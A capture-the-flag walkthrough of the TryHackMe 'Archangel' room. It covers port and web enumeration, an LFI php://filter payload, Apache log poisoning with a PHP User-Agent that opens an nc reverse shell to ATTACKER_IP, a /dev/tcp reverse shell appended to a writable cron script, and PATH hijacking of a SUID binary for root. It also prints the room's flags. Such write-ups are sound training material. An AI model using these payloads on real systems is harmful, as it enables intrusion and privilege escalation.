---
tags:
  - tryhackme
  - challenge
  - easy
  - offensive
  - linux
  - web
  - boot2root
  - lfi
  - burp-suite
  - log-poisoning
---

# Archangel
![Archangel logo](logos/archangel_logo.png)

**Platform:** TryHackMe  
**Type:** Challenge  
**Difficulty:** Easy  
**Link:** [Archangel](https://tryhackme.com/room/archangel)  

## Description
"Boot2root, Web exploitation, Privilege escalation, LFI  
A well known security solutions company seems to be doing some testing on their live machine. Best time to exploit it."

## Enumeration
### Port Scanning
```
ports=$(nmap -p- --min-rate=1000 TARGET_IP_ADDRESS | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
nmap -p$ports -A -T4 TARGET_IP_ADDRESS
```

```
Host is up (0.021s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
|   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
|_  256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Wavefire
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone
Running (JUST GUESSING): Linux 5.X|6.X|4.X (96%), Google Android 10.X|11.X|12.X (93%)
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:6 cpe:/o:linux:linux_kernel:4 cpe:/o:google:android:10 cpe:/o:google:android:11 cpe:/o:google:android:12 cpe:/o:linux:linux_kernel:5.4
Aggressive OS guesses: Linux 5.14 - 6.8 (96%), Linux 4.15 - 5.19 (96%), Linux 4.15 (96%), Linux 5.4 - 5.15 (96%), Android 10 - 12 (Linux 4.14 - 4.19) (93%), Android 10 - 11 (Linux 4.9 - 4.14) (92%), Android 12 (Linux 5.4) (92%), Android 9 - 11 (Linux 4.9 - 4.14) (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 3 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### HTTP Enumeration
```
ffuf -u http://TARGET_IP_ADDRESS/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c
gobuster dir -u TARGET_IP_ADDRESS -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt
```

**Notes**  

* No `robots.txt` or `sitemap` files  
* Holding page - no meaningful content apart from a domain name  
* Nothing interesting in the source code  
* `/flags` directory uncovered in `ffuf` scan results in a RickRoll video (official Rick Astley YT account)  
??? success "Find a different hostname"
	mafialive.thm

**Action(s)**  
:white_check_mark: Add "mafialive.thm" to `/etc/hosts`

**Notes**  

* Navigating to hostname reveals flag
??? success "Find flag 1"
	thm{f0und_th3_r1ght_h0st_n4m3} 

```
ffuf -u http://TARGET_IP_ADDRESS/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -ic -c
gobuster dir -u TARGET_IP_ADDRESS -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,html,txt
```

**Notes**  

* `gobuster` scan reveals page in development; source code reveals ability to enumerate local files on web server
??? success "Look for a page under development"
	`test.php`

### Vulnerability Enumeration
```
searchsploit OpenSSH 7.6p1	# Only result: username enumeration
searchsploit http 2.4.29	# Only result: DoS
```

## Foothold
**Action(s)**  
:white_check_mark: Test LFI payloads in query parameter  
*Successful payload to view source code: `http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php`*  
??? success "Find flag 2"
	thm{explo1t1ng_lf1}

**Action(s)**  
:white_check_mark: Use LFI to perform log poisoning with customised User-Agent  
*Successful Burp request to inject log poisoning payload shown below*

### LFI + Log Poisoning
```
# Burp Request
GET /test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/.././.././.././../var/log/apache2/access.log HTTP/1.1

Host: mafialive.thm

User-Agent: <?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP_ 1234 >/tmp/f') ?>

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Connection: keep-alive

Upgrade-Insecure-Requests: 1

Priority: u=0, i

# From attacker machine
nc -lvnp 1234

# In web browser
http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/.././.././.././../var/log/apache2/access.log

# On attacker machine
$ python3 -c 'import pty; pty.spawn("/bin/bash")'

www-data@ubuntu:/var/www/html/development_testing$ ls -al /home
total 12
drwxr-xr-x  3 root      root      4096 Nov 18  2020 .
drwxr-xr-x 22 root      root      4096 Nov 16  2020 ..
drwxr-xr-x  6 archangel archangel 4096 Nov 20  2020 archangel

www-data@ubuntu:/var/www/html/development_testing$ ls -al /home/archangel
total 44
drwxr-xr-x 6 archangel archangel 4096 Nov 20  2020 .
drwxr-xr-x 3 root      root      4096 Nov 18  2020 ..
-rw-r--r-- 1 archangel archangel  220 Nov 18  2020 .bash_logout
-rw-r--r-- 1 archangel archangel 3771 Nov 18  2020 .bashrc
drwx------ 2 archangel archangel 4096 Nov 18  2020 .cache
drwxrwxr-x 3 archangel archangel 4096 Nov 18  2020 .local
-rw-r--r-- 1 archangel archangel  807 Nov 18  2020 .profile
-rw-rw-r-- 1 archangel archangel   66 Nov 18  2020 .selected_editor
drwxr-xr-x 2 archangel archangel 4096 Nov 18  2020 myfiles
drwxrwx--- 2 archangel archangel 4096 Nov 19  2020 secret
-rw-r--r-- 1 archangel archangel   26 Nov 19  2020 user.txt

www-data@ubuntu:/var/www/html/development_testing$ cat /home/archangel/user.txt
<l/development_testing$ cat /home/archangel/user.txt
```
??? success "Get a shell and find the user flag"
	thm{lf1_t0_rc3_1s_tr1cky}

## Privilege Escalation (Horizontal)
```
www-data@ubuntu:/var/www/html/development_testing$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   archangel /opt/helloworld.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#

www-data@ubuntu:/var/www/html/development_testing$ ls -al /opt/helloworld.sh
-rwxrwxrwx 1 archangel archangel 66 Nov 20  2020 /opt/helloworld.sh

www-data@ubuntu:/var/www/html/development_testing$ cat /opt/helloworld.sh
#!/bin/bash
echo "hello world" >> /opt/backupfiles/helloworld.txt

www-data@ubuntu:/var/www/html/development_testing$ echo 'sh -i >& /dev/tcp/ATTACKER_IP_ADDRESS/4444 0>&1' >> /opt/helloworld.sh

# On attacker machine
nc -lvnp 4444                     
Listening on 0.0.0.0 4444
Connection received on 10.128.144.230 56940
sh: 0: can't access tty; job control turned off

$ python3 -c 'import pty; pty.spawn("/bin/bash")'

archangel@ubuntu:~$ pwd
/home/archangel

archangel@ubuntu:~$ ls -al secret
total 32
drwxrwx--- 2 archangel archangel  4096 Nov 19  2020 .
drwxr-xr-x 6 archangel archangel  4096 Nov 20  2020 ..
-rwsr-xr-x 1 root      root      16904 Nov 18  2020 backup
-rw-r--r-- 1 root      root         49 Nov 19  2020 user2.txt

archangel@ubuntu:~$ cat secret/user2.txt
```
??? success "Get User 2 flag "
	thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}

## Privilege Escalation (Vertical)
**Notes**  

* `/home/archangel/secret` directory contains a SUID binary called `backup` owned by the `root` user
* `backup` binary uses `cp` to copy files without specifying an exact path to the binary

**Action(s)**  
:white_check_mark: Insert a writable directory into `$PATH`  
:white_check_mark: Create custom `cp` binary that can create a shell (should run as `root` when `backup` binary executed)  

```
archangel@ubuntu:~$ PATH=/home/archangel:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

archangel@ubuntu:~$ touch cp

archangel@ubuntu:~$ echo '#!/bin/bash' > cp

archangel@ubuntu:~$ echo 'sh -i >& /dev/tcp/ATTACKER_IP_ADDRESS/1337 0>&1' >> cp

archangel@ubuntu:~$  chmod +x cp

# On attacker machine
nc -lvnp 1337

# On target machine
archangel@ubuntu:~$ /home/archangel/secret/backup

# On attacker machine
$ ls -al /root
total 28
drwx------  4 root root 4096 Nov 20  2020 .
drwxr-xr-x 22 root root 4096 Nov 16  2020 ..
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Nov 18  2020 .cache
drwxr-xr-x  3 root root 4096 Nov 16  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   68 Nov 19  2020 root.txt
$ cat /root/root.txt
```
??? success "Root the machine and find the root flag"
	thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}

**Tools Used**  
`Burp Suite`

**Date completed:** 15/05/26  
**Date published:** 15/05/26